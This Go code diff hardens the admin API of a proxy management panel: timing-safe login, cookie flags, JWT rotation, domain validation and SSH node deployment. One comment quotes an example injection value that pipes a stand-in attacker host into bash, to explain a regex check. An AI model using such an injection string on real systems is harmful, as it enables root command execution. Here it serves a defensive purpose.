@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -30,10 +31,19 @@ import (
 
 // RandomToken 生成随机 Token 字符串
 func RandomToken(length int) string {
+	if length <= 0 {
+		length = 16
+	}
 	b := make([]byte, length)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		// 极端情况下 (内核熵源异常) 退回 UUID, 绝不允许返回全 0 的低熵令牌
+		return strings.ReplaceAll(uuid.NewString(), "-", "")
+	}
 	return hex.EncodeToString(b)
 }
+
+// dummyBcryptHash 仅用于让"账号不存在"分支也付出同等 bcrypt 计算开销 (防时序枚举)
+const dummyBcryptHash = "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
 
 // LoginRequest 登录请求载荷
 type LoginRequest struct {
@@ -64,6 +74,8 @@ func HandleLogin(c *gin.Context) {
 	// 2. 数据库检索管理员
 	var admin model.Admin
 	if err := model.DB.Where("username = ?", req.Username).First(&admin).Error; err != nil {
+		// 即使账号不存在也执行一次等价开销的 bcrypt 比对, 避免通过响应耗时枚举管理员账号
+		_ = bcrypt.CompareHashAndPassword([]byte(dummyBcryptHash), []byte(req.Password))
 		middleware.GlobalLoginLimiter.RecordFailure(clientIP)
 		c.JSON(http.StatusUnauthorized, gin.H{"error": "用户名或密码错误"})
 		return
@@ -100,8 +112,10 @@ func HandleLogin(c *gin.Context) {
 		return
 	}
 
-	// 设置安全 Cookie (方便直接浏览器鉴权)
-	c.SetCookie("workv_token", token, cookieMaxAge, "/", "", false, true)
+	// 设置安全 Cookie (方便直接浏览器鉴权; 反代终止 TLS 时依据 X-Forwarded-Proto 判定 Secure)
+	isHTTPS := c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https"
+	c.SetSameSite(http.SameSiteLaxMode)
+	c.SetCookie("workv_token", token, cookieMaxAge, "/", "", isHTTPS, true)
 
 	c.JSON(http.StatusOK, gin.H{
 		"token": token,
@@ -142,8 +156,18 @@ func HandleChangePassword(c *gin.Context) {
 		return
 	}
 
-	model.DB.Model(&admin).Update("password_hash", string(newHash))
-	c.JSON(http.StatusOK, gin.H{"message": "密码修改成功"})
+	if err := model.DB.Model(&admin).Update("password_hash", string(newHash)).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存新密码失败: " + err.Error()})
+		return
+	}
+
+	// 安全: 轮换 JWT 密钥, 使所有已签发的旧令牌立即失效 (否则被盗令牌可继续用到过期)
+	newSecret := RandomToken(32)
+	if err := model.SetSetting("jwt_secret", newSecret); err == nil {
+		middleware.SetJWTSecret(newSecret)
+	}
+
+	c.JSON(http.StatusOK, gin.H{"message": "密码修改成功，请使用新密码重新登录", "relogin": true})
 }
 
 // HandleGetSafeEntrance 获取当前安全入口状态与完整 URL (含域名模式)
@@ -181,13 +205,26 @@ func HandleSetSafeEntrance(c *gin.Context) {
 	}
 
 	if req.SafePath != "" {
+		if err := middleware.ValidateSafePath(req.SafePath); err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+			return
+		}
 		middleware.SetSafePath(req.SafePath)
-		_, newPath := middleware.GetSafePath()
-		model.DB.Save(&model.SystemSetting{
-			Key:       "safe_path",
-			Value:     newPath,
-			UpdatedAt: time.Now(),
-		})
+		enabledNow, newPath := middleware.GetSafePath()
+		if enabledNow {
+			model.DB.Save(&model.SystemSetting{
+				Key:       "safe_path",
+				Value:     newPath,
+				UpdatedAt: time.Now(),
+			})
+			_ = model.SetSetting("safe_entry_enabled", "1")
+			// 立刻给当前浏览器换上与新路径匹配的入口 Cookie,
+			// 否则改完路径后这个会话马上会被自己刚刚设置的规则挡在门外
+			middleware.SetSafeEntranceCookie(c)
+		} else {
+			// "/" 或空串代表关闭安全入口: 必须显式落库开关, 否则重启后会被默认值重新打开
+			_ = model.SetSetting("safe_entry_enabled", "0")
+		}
 	}
 
 	if req.Domain != "" {
@@ -195,6 +232,12 @@ func HandleSetSafeEntrance(c *gin.Context) {
 		cleanDomain = strings.TrimPrefix(cleanDomain, "http://")
 		cleanDomain = strings.TrimPrefix(cleanDomain, "https://")
 		cleanDomain = strings.TrimRight(cleanDomain, "/")
+		// 安全: 域名会被写进免鉴权的 /install.sh (root 执行), 必须严格校验字符集,
+		// 否则 `evil.com";curl attacker|bash;#` 这类值会变成存储型命令注入。
+		if !hostOnlyRe.MatchString(cleanDomain) {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "域名格式不合法 (只允许字母/数字/点/横线, 可带端口)"})
+			return
+		}
 		_ = model.SetSetting("master_domain", cleanDomain)
 	}
 
@@ -278,6 +321,114 @@ func HandleGetNodes(c *gin.Context) {
 	c.JSON(http.StatusOK, nodes)
 }
 
+// hostOnlyRe 校验 Host/域名字符集, 防止把请求头拼进远端 shell 命令 (命令注入)
+var hostOnlyRe = regexp.MustCompile(`^[A-Za-z0-9.-]+(:[0-9]{1,5})?$`)
+
+// resolveMasterBaseURL 计算主控对外可访问地址 (优先主控域名, 其次请求 Host)
+func resolveMasterBaseURL(c *gin.Context) (string, error) {
+	if d := strings.TrimSpace(model.GetSetting("master_domain", "")); d != "" {
+		d = strings.TrimRight(d, "/")
+		if strings.HasPrefix(d, "http://") || strings.HasPrefix(d, "https://") {
+			return d, nil
+		}
+		if !hostOnlyRe.MatchString(d) {
+			return "", fmt.Errorf("主控域名 %q 不合法", d)
+		}
+		return "https://" + d, nil
+	}
+
+	scheme := "http"
+	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
+		scheme = "https"
+	}
+	host := strings.TrimSpace(c.Request.Host)
+	if !hostOnlyRe.MatchString(host) {
+		return "", fmt.Errorf("无法确定主控对外地址, 请先配置域名: work-v domain <你的域名>")
+	}
+	return scheme + "://" + host, nil
+}
+
+// HandleAutoDeployNode 一键自动部署: 创建节点并通过 SSH 在目标服务器安装 Agent。
+// SSH 密码仅用于本次连接, 不落库、不写日志。
+func HandleAutoDeployNode(c *gin.Context) {
+	var req struct {
+		Name        string  `json:"name" binding:"required"`
+		Address     string  `json:"address"`
+		Rate        float64 `json:"rate"`
+		SSHHost     string  `json:"ssh_host" binding:"required"`
+		SSHPort     int     `json:"ssh_port"`
+		SSHUser     string  `json:"ssh_user"`
+		SSHPassword string  `json:"ssh_password" binding:"required"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "请填写节点名称、目标服务器地址与 SSH 密码"})
+		return
+	}
+
+	base, err := resolveMasterBaseURL(c)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+
+	if req.Rate <= 0 {
+		req.Rate = 1.0
+	}
+	if req.SSHUser == "" {
+		req.SSHUser = "root"
+	}
+	if req.SSHPort <= 0 || req.SSHPort > 65535 {
+		req.SSHPort = 22
+	}
+	if strings.TrimSpace(req.Address) == "" {
+		req.Address = req.SSHHost // 默认用目标机地址作为客户端连接地址
+	}
+
+	node := model.Node{
+		Name:         req.Name,
+		Address:      req.Address,
+		Rate:         req.Rate,
+		Token:        "node_" + RandomToken(16),
+		Status:       "offline",
+		DeployStatus: "running",
+		DeployHost:   req.SSHHost,
+	}
+	if err := model.DB.Create(&node).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存节点失败: " + err.Error()})
+		return
+	}
+	service.GetOrCreateDefaultInbounds(&node)
+
+	service.AutoDeployNode(node.ID, service.AutoDeployRequest{
+		Host:     req.SSHHost,
+		Port:     req.SSHPort,
+		User:     req.SSHUser,
+		Password: req.SSHPassword,
+		BaseURL:  base,
+	})
+
+	log.Printf("[AutoDeploy] 节点 %d (%s) 开始自动部署到 %s@%s:%d", node.ID, node.Name, req.SSHUser, req.SSHHost, req.SSHPort)
+	c.JSON(http.StatusOK, gin.H{"message": "已创建节点并开始自动部署", "node": node})
+}
+
+// HandleGetAutoDeployStatus 查询自动部署进度与日志 (前端轮询)
+func HandleGetAutoDeployStatus(c *gin.Context) {
+	id, _ := strconv.Atoi(c.Param("id"))
+	var node model.Node
+	if err := model.DB.First(&node, id).Error; err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
+		return
+	}
+	c.JSON(http.StatusOK, gin.H{
+		"id":            node.ID,
+		"name":          node.Name,
+		"address":       node.Address,
+		"status":        node.Status,
+		"deploy_status": node.DeployStatus,
+		"deploy_log":    node.DeployLog,
+	})
+}
+
 // HandleCreateNode 创建节点 (支持免填地址，上线自动回填)
 func HandleCreateNode(c *gin.Context) {
 	var req struct {
@@ -359,10 +510,23 @@ func HandleUpdateNode(c *gin.Context) {
 	c.JSON(http.StatusOK, node)
 }
 
-// HandleDeleteNode 删除节点
+// HandleDeleteNode 删除节点 (同时主动断开长连)
+// 历史实现只软删记录: 被删节点依然连着长连, sing-box 带着最后一份配置继续为用户转发流量,
+// 心跳更新打在已软删的行上静默失效, 推送配置也永远报"节点不存在"。
 func HandleDeleteNode(c *gin.Context) {
 	id, _ := strconv.Atoi(c.Param("id"))
-	model.DB.Delete(&model.Node{}, id)
+	var node model.Node
+	if err := model.DB.First(&node, id).Error; err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "节点不存在"})
+		return
+	}
+
+	// 先断连再落库, 杜绝"记录已删、进程仍在服务"的孤儿节点
+	hub.GlobalHub.KickNode(node.ID)
+	if err := model.DB.Delete(&node).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除节点失败: " + err.Error()})
+		return
+	}
 	c.JSON(http.StatusOK, gin.H{"message": "删除成功"})
 }
 
@@ -387,9 +551,9 @@ func HandleGetUsers(c *gin.Context) {
 // HandleCreateUser 创建订阅用户
 func HandleCreateUser(c *gin.Context) {
 	var req struct {
-		Username     string `json:"username" binding:"required"`
-		TrafficLimitGB int64 `json:"traffic_limit_gb"` // GB
-		ExpireDays   int64  `json:"expire_days"`      // 天数
+		Username       string `json:"username" binding:"required"`
+		TrafficLimitGB int64  `json:"traffic_limit_gb"` // GB
+		ExpireDays     int64  `json:"expire_days"`      // 天数
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "请提供有效用户名"})
@@ -485,9 +649,14 @@ func HandleUpdateUser(c *gin.Context) {
 func HandleDeleteUser(c *gin.Context) {
 	id, _ := strconv.Atoi(c.Param("id"))
 	var user model.User
-	if err := model.DB.First(&user, id).Error; err == nil {
-		hub.GlobalHub.BroadcastCutoffUser(user.UUID)
-		model.DB.Delete(&user)
+	if err := model.DB.First(&user, id).Error; err != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "用户不存在"})
+		return
+	}
+	hub.GlobalHub.BroadcastCutoffUser(user.UUID)
+	if err := model.DB.Delete(&user).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "删除失败: " + err.Error()})
+		return
 	}
 	c.JSON(http.StatusOK, gin.H{"message": "删除成功"})
 }
@@ -505,7 +674,8 @@ func HandleGetNodeLinks(c *gin.Context) {
 	var user model.User
 	userUUID := "11111111-2222-3333-4444-555555555555"
 	username := "default_user"
-	if err := model.DB.Where("status = ?", "active").First(&user).Error; err == nil {
+	// 固定取最早创建的活跃用户, 避免每次刷新示范链接指向不同用户
+	if err := model.DB.Where("status = ?", "active").Order("id asc").First(&user).Error; err == nil {
 		userUUID = user.UUID
 		username = user.Username
 	}
@@ -746,10 +916,9 @@ func HandleUpdateSystemSettings(c *gin.Context) {
 }
 
 var (
-	sbVersionCache  string
-	sbLatestCache   string
-	sbCacheTime     time.Time
-	sbCacheMu       sync.Mutex
+	sbLatestCache string
+	sbCacheTime   time.Time
+	sbCacheMu     sync.Mutex
 )
 
 // HandleGetSingboxVersion 获取本地与远端 sing-box 最新版本 (带 1 小时缓存防 GitHub 403 限流)
@@ -868,7 +1037,8 @@ func HandleUpgradeSingbox(c *gin.Context) {
 		_ = exec.Command("chmod", "755", targetBin).Run()
 
 		// 重启服务生效
-		_ = exec.Command("systemctl", "restart", "work-v-master").Run()
+		// 主控自身不运行 sing-box, 而且正在处理本次请求 —— 重启它会打断响应并制造无谓停机。
+		// 只有同机部署的 Agent 需要重载新内核。
 		_ = exec.Command("systemctl", "restart", "work-v-agent").Run()
 	}()
 
